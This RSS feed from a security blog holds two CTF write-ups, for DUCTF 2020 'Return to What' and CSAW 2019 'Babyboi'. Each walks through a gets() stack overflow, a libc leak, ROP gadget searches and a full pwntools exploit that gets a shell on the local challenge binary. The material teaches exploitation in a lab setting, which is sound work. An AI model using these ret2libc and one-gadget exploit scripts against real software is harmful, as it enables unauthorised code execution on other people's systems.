<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>ROP on Anvbis</title><link>https://anvbis.github.io/categories/rop/</link><description>Recent content in ROP on Anvbis</description><generator>Hugo -- gohugo.io</generator><language>en-au</language><copyright>Copyright 2020 Anvbis</copyright><lastBuildDate>Mon, 16 Aug 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/categories/rop/index.xml" rel="self" type="application/rss+xml"/><item><title>DUCTF 2020 :: Return to What</title><link>https://anvbis.github.io/posts/ductf-2020-return-to-what/</link><pubDate>Mon, 16 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/ductf-2020-return-to-what/</guid><description>Reverse Engineering We&amp;rsquo;ll start by running file to get an idea of the executable&amp;rsquo;s architecture and platform. Note that it is a 64-bit linux executable.
$ file return-to-what return-to-what: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=02d43d7f8ca04895439f73b904f5204ba9984802, not stripped Running pwntools' checksec tool reveals that the only exploit protection in place is an enabled NX bit. So while we can&amp;rsquo;t execute shellcode on the stack, we&amp;rsquo;ll at least be able to access any part of the executable.</description><content>&lt;h2 id="reverse-engineering">Reverse Engineering&lt;/h2>
&lt;p>We&amp;rsquo;ll start by running &lt;code>file&lt;/code> to get an idea of the executable&amp;rsquo;s architecture and platform. Note that it is a 64-bit linux executable.&lt;/p>
&lt;pre>&lt;code>$ file return-to-what
return-to-what: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=02d43d7f8ca04895439f73b904f5204ba9984802, not stripped
&lt;/code>&lt;/pre>&lt;p>Running pwntools' &lt;code>checksec&lt;/code> tool reveals that the only exploit protection in place is an enabled NX bit. So while we can&amp;rsquo;t execute shellcode on the stack, we&amp;rsquo;ll at least be able to access any part of the executable.&lt;/p>
&lt;pre>&lt;code>$ checksec return-to-what 130 ⨯
[*] './return-to-what'
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
&lt;/code>&lt;/pre>&lt;p>Running the executable reveals that it&amp;rsquo;s only functionality is to accept user input, prior to exiting. It&amp;rsquo;s likely that we&amp;rsquo;ll find a vulnerability of some sort here.&lt;/p>
&lt;pre>&lt;code>$ ./return-to-what
Today, we'll have a lesson in returns.
Where would you like to return to?
asdf
&lt;/code>&lt;/pre>&lt;p>Disassembly the executable shows us that it contains two important functions. The &lt;code>main&lt;/code> function, which calls a function called &lt;code>vuln&lt;/code>. The &lt;code>vuln&lt;/code> function makes a &lt;code>gets&lt;/code> call, we&amp;rsquo;ve found a buffer overflow.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">vuln&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>s;
puts(&lt;span style="color:#e6db74">&amp;#34;Where would you like to return to?&amp;#34;&lt;/span>);
gets(&lt;span style="color:#f92672">&amp;amp;&lt;/span>s);
&lt;span style="color:#66d9ef">return&lt;/span>;
}
undefined8 &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
puts(&lt;span style="color:#e6db74">&amp;#34;Today, we&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">ll have a lesson in returns.&amp;#34;&lt;/span>);
vuln();
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Since the executable doesn&amp;rsquo;t leak any import information to us (such as a &lt;code>libc&lt;/code> address), we&amp;rsquo;ll have to find a way to leak something ourselves.&lt;/p>
&lt;p>Looking at the imported functions, we can see an entry for &lt;code>puts&lt;/code>. With this we should be able to do a classic &lt;code>libc&lt;/code> leak with &lt;code>puts(puts)&lt;/code>, more on that later.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; info functions
All defined functions:
Non-debugging symbols:
0x0000000000401000 _init
0x0000000000401030 puts@plt
0x0000000000401040 gets@plt
0x0000000000401050 setvbuf@plt
0x0000000000401060 _start
0x0000000000401090 _dl_relocate_static_pie
0x00000000004010a0 deregister_tm_clones
0x00000000004010d0 register_tm_clones
0x0000000000401110 __do_global_dtors_aux
0x0000000000401140 frame_dummy
0x0000000000401142 setup
0x0000000000401185 vuln
0x00000000004011ad main
0x00000000004011d0 __libc_csu_init
0x0000000000401230 __libc_csu_fini
0x0000000000401234 _fini
&lt;/code>&lt;/pre>&lt;p>Before going any further, let&amp;rsquo;s find the offset of the &lt;code>puts&lt;/code> function within &lt;code>libc&lt;/code>. Below is a few GDB commands that achieves this goal.&lt;/p>
&lt;p>Here&amp;rsquo;s what we&amp;rsquo;re doing:&lt;/p>
&lt;ul>
&lt;li>Printing the process map to get the start address of &lt;code>libc&lt;/code>.&lt;/li>
&lt;li>Getting the address of &lt;code>puts&lt;/code>.&lt;/li>
&lt;li>Subtracting the start address of &lt;code>libc&lt;/code> from &lt;code>puts&lt;/code> to get the offset.&lt;/li>
&lt;/ul>
&lt;pre>&lt;code>pwndbg&amp;gt; info proc map
process 1968
Mapped address spaces:
Start Addr End Addr Size Offset objfile
...
0x7ffff7def000 0x7ffff7e14000 0x25000 0x0 /usr/lib/x86_64-linux-gnu/libc-2.31.so
...
pwndbg&amp;gt; p puts
$4 = {int (const char *)} 0x7ffff7e655f0 &amp;lt;__GI__IO_puts&amp;gt;
pwndbg&amp;gt; p/x 0x7ffff7e655f0-0x7ffff7def000
$5 = 0x765f0
&lt;/code>&lt;/pre>&lt;p>There are a few more things we need to find before we can write our shellcode, mainly:&lt;/p>
&lt;ul>
&lt;li>A &lt;code>pop rdi&lt;/code> instruction, so we can leak &lt;code>libc&lt;/code>.&lt;/li>
&lt;li>The &amp;lsquo;magic&amp;rsquo; gadget, so we can get a shell.&lt;/li>
&lt;/ul>
&lt;p>We can use the &lt;code>ropper&lt;/code> tool to find a &lt;code>pop rdi&lt;/code> instruction, easily found within the executable.&lt;/p>
&lt;pre>&lt;code>$ ropper --file ./return-to-what --search 'pop rdi'
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi
[INFO] File: ./return-to-what
0x000000000040122b: pop rdi; ret;
&lt;/code>&lt;/pre>&lt;p>Using the &lt;code>one_gadget&lt;/code> tool, we can find a &amp;lsquo;magic&amp;rsquo; gadget that&amp;rsquo;ll immediately give us a shell, provided we meet the conditions. We just need a rop gadget that will help us set this up.&lt;/p>
&lt;pre>&lt;code>$ one_gadget /usr/lib/x86_64-linux-gnu/libc-2.31.so
0xcbd1a execve(&amp;quot;/bin/sh&amp;quot;, r12, r13)
constraints:
[r12] == NULL || r12 == NULL
[r13] == NULL || r13 == NULL
0xcbd1d execve(&amp;quot;/bin/sh&amp;quot;, r12, rdx)
constraints:
[r12] == NULL || r12 == NULL
[rdx] == NULL || rdx == NULL
0xcbd20 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
constraints:
[rsi] == NULL || rsi == NULL
[rdx] == NULL || rdx == NULL
&lt;/code>&lt;/pre>&lt;p>The &amp;lsquo;magic&amp;rsquo; gadget I like the most is the first one, so let&amp;rsquo;s find a gadget that&amp;rsquo;ll set this up. We&amp;rsquo;ll use &lt;code>ropper&lt;/code> again.&lt;/p>
&lt;pre>&lt;code>$ ropper --file ./return-to-what --search 'pop r12'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop r12
[INFO] File: ./return-to-what
0x0000000000401224: pop r12; pop r13; pop r14; pop r15; ret;
&lt;/code>&lt;/pre>&lt;h2 id="information-gathering">Information Gathering&lt;/h2>
&lt;p>Now that we&amp;rsquo;ve found everything we need, we can do a little more information gathering to get the last thing we need for our exploit - the offset of the return address from our input buffer.&lt;/p>
&lt;p>Here&amp;rsquo;s a quick script that&amp;rsquo;ll attach the process to GDB before sending a large cyclic pattern of bytes to it, allowing us to find the offset of the return address.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./return-to-what&amp;#39;&lt;/span>)
gdb&lt;span style="color:#f92672">.&lt;/span>attach(r)
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>writeline(cyclic(&lt;span style="color:#ae81ff">100&lt;/span>, n&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>))
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>After continuing in GDB and letting the program crash, we can see what was stored in the return address.&lt;/p>
&lt;pre>&lt;code> ► 0x4011ac &amp;lt;vuln+39&amp;gt; ret &amp;lt;0x6161616161616168&amp;gt;
&lt;/code>&lt;/pre>&lt;p>Using pwntools' &lt;code>cyclic_find&lt;/code> function, we can use the value we found above to calculate the offset of the return address from our input buffer.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">In [&lt;span style="color:#ae81ff">2&lt;/span>]: cyclic_find(&lt;span style="color:#ae81ff">0x6161616161616168&lt;/span>, n&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>)
Out[&lt;span style="color:#ae81ff">2&lt;/span>]: &lt;span style="color:#ae81ff">56&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="exploit-development">Exploit Development&lt;/h2>
&lt;p>Now that we have everything we need, we can begin to write our exploit. There&amp;rsquo;s quite a few things that we need to achieve, here&amp;rsquo;s a list:&lt;/p>
&lt;ul>
&lt;li>Overwrite the return address to get control of process execution.&lt;/li>
&lt;li>Use &lt;code>puts&lt;/code> to print the value of &lt;code>puts&lt;/code> stored in the global offset table (a &lt;code>libc&lt;/code> address).&lt;/li>
&lt;li>Capture the leaked &lt;code>libc&lt;/code> address, and subtract the offset of the &lt;code>puts&lt;/code> address to get the start address of &lt;code>libc&lt;/code>.&lt;/li>
&lt;li>Use the leaked &lt;code>libc&lt;/code> address to redirect process execution to our &amp;lsquo;magic&amp;rsquo; gadget to get a shell.&lt;/li>
&lt;/ul>
&lt;p>Keep in mind that we need to setup carefully for the &amp;lsquo;magic&amp;rsquo; gadget, as it&amp;rsquo;ll only execute under specific circumstances.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
context&lt;span style="color:#f92672">.&lt;/span>clear(arch&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;amd64&amp;#39;&lt;/span>)
pad &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">56&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">0x000000000040122b: pop rdi; ret;
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
pop_rdi &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x040122b&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">0x0000000000401224: pop r12; pop r13; pop r14; pop r15; ret;
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
setup &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0401224&lt;/span>
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./return-to-what&amp;#39;&lt;/span>)
elf &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./return-to-what&amp;#39;&lt;/span>)
rop &lt;span style="color:#f92672">=&lt;/span> ROP(elf)
&lt;span style="color:#75715e"># pop rdi; ret&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(pop_rdi)
rop&lt;span style="color:#f92672">.&lt;/span>raw(elf&lt;span style="color:#f92672">.&lt;/span>got[&lt;span style="color:#e6db74">&amp;#39;puts&amp;#39;&lt;/span>]) &lt;span style="color:#75715e"># pop rdi&lt;/span>
&lt;span style="color:#75715e"># puts&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(elf&lt;span style="color:#f92672">.&lt;/span>plt[&lt;span style="color:#e6db74">&amp;#39;puts&amp;#39;&lt;/span>]) &lt;span style="color:#75715e"># puts(puts)&lt;/span>
&lt;span style="color:#75715e"># main&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(elf&lt;span style="color:#f92672">.&lt;/span>sym[&lt;span style="color:#e6db74">&amp;#39;main&amp;#39;&lt;/span>])
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>writeline(pad &lt;span style="color:#f92672">+&lt;/span> rop&lt;span style="color:#f92672">.&lt;/span>chain())
leak &lt;span style="color:#f92672">=&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>readline()[:&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>]
leak &lt;span style="color:#f92672">=&lt;/span> unpack(leak, len(leak) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>)
libc &lt;span style="color:#f92672">=&lt;/span> leak &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0x765f0&lt;/span>
magic &lt;span style="color:#f92672">=&lt;/span> libc &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0xcbd1a&lt;/span>
rop &lt;span style="color:#f92672">=&lt;/span> ROP(elf)
&lt;span style="color:#75715e"># setup &lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(setup)
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r12&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r13&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r14&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r15&lt;/span>
&lt;span style="color:#75715e"># magic gadget&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(magic)
r&lt;span style="color:#f92672">.&lt;/span>writeline(pad &lt;span style="color:#f92672">+&lt;/span> rop&lt;span style="color:#f92672">.&lt;/span>chain())
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And finally, here&amp;rsquo;s our exploit in action. It gives us an interactive shell that we can use to read the flag.&lt;/p>
&lt;pre>&lt;code>$ ./exploit.py
[+] Starting local process './return-to-what': pid 2145
[*] './return-to-what'
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
[*] Loaded 14 cached gadgets for './return-to-what'
[*] Switching to interactive mode
$ cat flag.txt
DUCTF{ret_pUts_ret_main_ret_where???}
$
[*] Stopped process './return-to-what' (pid 2145)
&lt;/code>&lt;/pre></content></item><item><title>CSAW 2019 :: Babyboi</title><link>https://anvbis.github.io/posts/csaw-2019-babyboi/</link><pubDate>Sat, 14 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/csaw-2019-babyboi/</guid><description>Reverse Engineering Let&amp;rsquo;s use the file command to get a little bit of insight into this executable. Note that it is a 64-bit linux binary.
$ file ./baby_boi baby_boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e1ff55dce2efc89340b86a666bba5e7ff2b37f62, not stripped We can also use pwntools' checksec tool to see what exploit protections it has in place. Note that the NX bit is set, but there is no stack canary, and PIE is disabled.</description><content>&lt;h2 id="reverse-engineering">Reverse Engineering&lt;/h2>
&lt;p>Let&amp;rsquo;s use the &lt;code>file&lt;/code> command to get a little bit of insight into this executable. Note that it is a 64-bit linux binary.&lt;/p>
&lt;pre>&lt;code>$ file ./baby_boi
baby_boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e1ff55dce2efc89340b86a666bba5e7ff2b37f62, not stripped
&lt;/code>&lt;/pre>&lt;p>We can also use pwntools' &lt;code>checksec&lt;/code> tool to see what exploit protections it has in place. Note that the NX bit is set, but there is no stack canary, and PIE is disabled.&lt;/p>
&lt;p>This means a couple things for us:&lt;/p>
&lt;ul>
&lt;li>We can&amp;rsquo;t execute shellcode on the stack.&lt;/li>
&lt;li>Probably vulnerable to a BOF as there is no stack canary.&lt;/li>
&lt;li>We might be able to build a ROP chain somewhere.&lt;/li>
&lt;/ul>
&lt;pre>&lt;code>checksec ./baby_boi
[*] './baby_boi'
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s run the executable and see what happens. The binary appears to leak some address (kinda looks like an address in &lt;code>libc&lt;/code>, we&amp;rsquo;ll definitely be able to use this).&lt;/p>
&lt;p>It also appears to prompt us for input. This is likely where we&amp;rsquo;ll find a vulnerability we can exploit.&lt;/p>
&lt;pre>&lt;code>$ ./baby_boi
Hello!
Here I am: 0x7f6b6221ecf0
asdfasdf
&lt;/code>&lt;/pre>&lt;p>Reversing the &lt;code>main&lt;/code> function reveals that the address leaked is indeed within &lt;code>libc&lt;/code>, it points to &lt;code>printf&lt;/code>. We&amp;rsquo;ll keep this in mind for later.&lt;/p>
&lt;pre>&lt;code>0x004006fc 488b05e50820. mov rax, qword [reloc.printf] ; sym..got
0x00400703 4889c6 mov rsi, rax
0x00400706 488d3dae0000. lea rdi, str.Here_I_am:__p_n ; 0x4007bb ; &amp;quot;Here I am: %p\n&amp;quot;
0x0040070d b800000000 mov eax, 0
0x00400712 e879feffff call sym..plt.got
&lt;/code>&lt;/pre>&lt;p>Towards the end of the &lt;code>main&lt;/code> function a call to &lt;code>gets&lt;/code> is made. Wonderful, we&amp;rsquo;ve found a buffer overflow vulnerability.&lt;/p>
&lt;pre>&lt;code>0x00400717 488d45e0 lea rax, [s]
0x0040071b 4889c7 mov rdi, rax ; char *s
0x0040071e b800000000 mov eax, 0
0x00400723 e848feffff call sym.imp.gets ; char *gets(char *s)
0x00400728 b800000000 mov eax, 0
0x0040072d c9 leave
0x0040072e c3 ret
&lt;/code>&lt;/pre>&lt;h2 id="information-gathering">Information Gathering&lt;/h2>
&lt;p>First, let&amp;rsquo;s find the offset of the return address from the input buffer &lt;code>*s&lt;/code> where &lt;code>gets&lt;/code> stores our user input.&lt;/p>
&lt;p>This is a small script that attaches the process to GDB before sending a large cyclic pattern of bytes. We can use this to determine the return address' offset.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./baby_boi&amp;#39;&lt;/span>)
gdb&lt;span style="color:#f92672">.&lt;/span>attach(r)
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>writeline(cyclic(&lt;span style="color:#ae81ff">300&lt;/span>, n&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>))
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>After continuing in GDB, and looking at the top of the stack we can see we&amp;rsquo;ve overwritten the return address with our garbage data.&lt;/p>
&lt;pre>&lt;code> ► 0x40072e &amp;lt;main+167&amp;gt; ret &amp;lt;0x6161616161616166&amp;gt;
&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s use pwntools' &lt;code>cyclic_find&lt;/code> function to calculate the offset of the return address from the start of our input.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">In [&lt;span style="color:#ae81ff">2&lt;/span>]: cyclic_find(&lt;span style="color:#ae81ff">0x6161616161616166&lt;/span>, n&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>)
Out[&lt;span style="color:#ae81ff">2&lt;/span>]: &lt;span style="color:#ae81ff">40&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now, let&amp;rsquo;s do some investigation within GDB. Using the &lt;code>info proc map&lt;/code> command we can see the start address where &lt;code>libc&lt;/code> is loaded, we&amp;rsquo;ll use this to calculate the offset of &lt;code>printf&lt;/code> from the start of &lt;code>libc&lt;/code>.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; info proc map
process 1332
Mapped address spaces:
Start Addr End Addr Size Offset objfile
0x400000 0x401000 0x1000 0x0 ./baby_boi
0x600000 0x601000 0x1000 0x0 ./baby_boi
0x601000 0x602000 0x1000 0x1000 ./baby_boi
0x7ffff7def000 0x7ffff7e14000 0x25000 0x0 /usr/lib/x86_64-linux-gnu/libc-2.31.so
...
pwndbg&amp;gt; p printf
$1 = {int (const char *, ...)} 0x7ffff7e45cf0 &amp;lt;__printf&amp;gt;
pwndbg&amp;gt; p/x 0x7ffff7e45cf0 - 0x7ffff7def000
$4 = 0x56cf0
&lt;/code>&lt;/pre>&lt;p>We can use a wonderful tool called &lt;code>one_gadget&lt;/code> to get an address in our &lt;code>libc&lt;/code> that will automatically give us a shell if we return to it (provided that the right conditions are met).&lt;/p>
&lt;pre>&lt;code>$ one_gadget /usr/lib/x86_64-linux-gnu/libc-2.31.so 130 ⨯
0xcbd1a execve(&amp;quot;/bin/sh&amp;quot;, r12, r13)
constraints:
[r12] == NULL || r12 == NULL
[r13] == NULL || r13 == NULL
0xcbd1d execve(&amp;quot;/bin/sh&amp;quot;, r12, rdx)
constraints:
[r12] == NULL || r12 == NULL
[rdx] == NULL || rdx == NULL
0xcbd20 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
constraints:
[rsi] == NULL || rsi == NULL
[rdx] == NULL || rdx == NULL
&lt;/code>&lt;/pre>&lt;p>We&amp;rsquo;ll use that first gadget, located at &lt;code>0xcbd1a&lt;/code> in combination with our leaked &lt;code>libc&lt;/code> address to get a shell.&lt;/p>
&lt;p>Using &lt;code>ropper&lt;/code> we can find a gadget that will allow us to setup the correct conditions for our magic gadget.&lt;/p>
&lt;pre>&lt;code>ropper --file ./baby_boi --search 'pop r12'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop r12
[INFO] File: ./baby_boi
0x000000000040078c: pop r12; pop r13; pop r14; pop r15; ret;
&lt;/code>&lt;/pre>&lt;h2 id="exploit-development">Exploit Development&lt;/h2>
&lt;p>Now it&amp;rsquo;s time to develop our exploit. Here&amp;rsquo;s an outline of the main steps we want to take:&lt;/p>
&lt;ul>
&lt;li>Capture the leaked &lt;code>printf&lt;/code> address.&lt;/li>
&lt;li>Calculate the start address of &lt;code>libc&lt;/code> using the leak and the offset of &lt;code>printf&lt;/code> we calculated earlier.&lt;/li>
&lt;li>Overwrite the return address with the address of our setup gadget.&lt;/li>
&lt;li>Return to &lt;code>libc&lt;/code> and our magic gadget to get a shell.&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
context&lt;span style="color:#f92672">.&lt;/span>arch &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;amd64&amp;#39;&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">0x000000000040078c: pop r12; pop r13; pop r14; pop r15; ret;
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
setup &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x40078c&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">0xcbd1a execve(&amp;#34;/bin/sh&amp;#34;, r12, r13)
&lt;/span>&lt;span style="color:#e6db74">constraints:
&lt;/span>&lt;span style="color:#e6db74"> [r12] == NULL || r12 == NULL
&lt;/span>&lt;span style="color:#e6db74"> [r13] == NULL || r13 == NULL
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
magic &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0cbd1a&lt;/span>
pad &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">40&lt;/span>
elf &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./baby_boi&amp;#39;&lt;/span>)
rop &lt;span style="color:#f92672">=&lt;/span> ROP(elf)
rop&lt;span style="color:#f92672">.&lt;/span>raw(setup)
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r12&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r13&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r14&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r15&lt;/span>
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./baby_boi&amp;#39;&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>readuntil(&lt;span style="color:#e6db74">&amp;#39;Here I am: &amp;#39;&lt;/span>)
libc &lt;span style="color:#f92672">=&lt;/span> eval(r&lt;span style="color:#f92672">.&lt;/span>readline()[:&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>]) &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0x56cf0&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(libc &lt;span style="color:#f92672">+&lt;/span> magic)
r&lt;span style="color:#f92672">.&lt;/span>writeline(pad &lt;span style="color:#f92672">+&lt;/span> rop&lt;span style="color:#f92672">.&lt;/span>chain())
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And finally, here&amp;rsquo;s the exploit in action.&lt;/p>
&lt;pre>&lt;code>$ ./exploit.py
[*] './baby_boi'
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
[*] Loaded 14 cached gadgets for './baby_boi'
[+] Starting local process './baby_boi': pid 2253
[*] Switching to interactive mode
$ cat flag.txt
csaw19{babyboi}
$
[*] Stopped process './baby_boi' (pid 2253)
